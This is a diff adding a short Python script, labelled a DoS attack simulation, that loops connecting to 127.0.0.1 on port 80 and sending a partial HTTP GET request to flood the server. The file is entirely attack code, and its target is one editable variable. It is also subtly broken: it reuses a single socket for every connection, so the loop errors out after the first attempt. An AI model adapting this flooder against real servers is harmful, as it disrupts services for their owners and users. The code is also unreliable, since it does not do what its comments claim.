@@ -1,0 +1,17 @@
+# Simple DoS attack simulation using socket
+import socket
+
+target = '127.0.0.1'
+port = 80
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Flood the server with requests
+while True:
+    try:
+        client.connect((target, port))
+        client.sendto(b"GET / HTTP/1.1\r\n", (target, port))
+        print("Packet sent")
+    except socket.error as e:
+        print(f"Error: {e}")
+        break
